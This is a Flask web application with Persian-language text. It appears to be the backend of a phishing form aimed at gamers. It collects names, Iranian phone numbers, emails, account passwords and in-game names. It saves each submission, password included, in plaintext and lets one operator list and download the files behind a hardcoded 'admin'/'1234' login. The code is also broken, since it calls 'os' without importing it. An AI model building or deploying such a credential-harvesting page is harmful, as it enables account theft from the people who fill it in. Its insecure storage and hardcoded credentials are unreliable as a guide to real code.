from flask import Flask, render_template, request, send_from_directory, abort
from pathlib import Path
from datetime import datetime
from werkzeug.utils import secure_filename
import re

app = Flask(__name__)

# پوشه ذخیره فایل‌ها
DATA_DIR = Path(app.root_path) / "users"
DATA_DIR.mkdir(parents=True, exist_ok=True)

# اعتبارسنجی شماره تلفن
def validate_phone(phone):
    pattern = r"^(0901|0902|0903|0930|0933|0935|0936|0937|0938|0939|0910|0911|0912|0913|0914|0915|0916|0917|0918|0919|0990|0991|0992|0993)\d{7}$"
    return re.match(pattern, phone)

# اعتبارسنجی ایمیل
DISPOSABLE_EMAIL_DOMAINS = ["mailinator.com", "tempmail.com", "guerrillamail.com", "10minutemail.com", "maildrop.cc"]
def validate_email_address(email):
    email_pattern = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
    if not re.match(email_pattern, email):
        return False, "فرمت ایمیل صحیح نیست."
    domain = email.split('@')[1]
    if domain in DISPOSABLE_EMAIL_DOMAINS:
        return False, "ایمیل موقت قابل قبول نیست."
    return True, ""

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fullname = request.form.get('fullname', '').strip()
    phone = request.form.get('phone', '').strip()
    company = request.form.get('company', '').strip()
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    gamename = request.form.get('gamename', '').strip()

    if len(fullname) < 7 or len(fullname) > 40:
        return render_template('index.html', message="نام و نام خانوادگی بین 7 تا 40 کاراکتر باشد.")
    if not validate_phone(phone):
        return render_template('index.html', message="شماره تلفن معتبر نیست.")
    is_valid_email, msg = validate_email_address(email)
    if not is_valid_email:
        return render_template('index.html', message=msg)

    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    safe_email = secure_filename(email.replace('@', '_at_')) or "unknown"
    filename = f"{safe_email}_{timestamp}.txt"
    file_path = DATA_DIR / filename

    with file_path.open('w', encoding='utf-8') as f:
        f.write(f"نام کامل: {fullname}\n")
        f.write(f"شماره تلفن: {phone}\n")
        f.write(f"روش اتصال: {company}\n")
        f.write(f"ایمیل: {email}\n")
        f.write(f"رمز عبور: {password}\n")
        f.write(f"نام در بازی: {gamename}\n")

    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید.")

# تنظیمات دسترسی فقط برای تو
USERNAME = "admin"  # نام کاربری خودت
PASSWORD = "1234"   # رمز عبور خودت

@app.route('/download/<filename>')
def download_file(filename):
    auth = request.authorization
    if not auth or auth.username != USERNAME or auth.password != PASSWORD:
        return ('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
    
    file_path = DATA_DIR / filename
    if file_path.exists():
        return send_from_directory(DATA_DIR, filename, as_attachment=True)
    return abort(404)

@app.route('/list')
def list_files():
    auth = request.authorization
    if not auth or auth.username != USERNAME or auth.password != PASSWORD:
        return ('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
    
    files = sorted([f.name for f in DATA_DIR.iterdir() if f.is_file()], reverse=True)
    return "<br>".join([f'<a href="/download/{f}">{f}</a>' for f in files])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
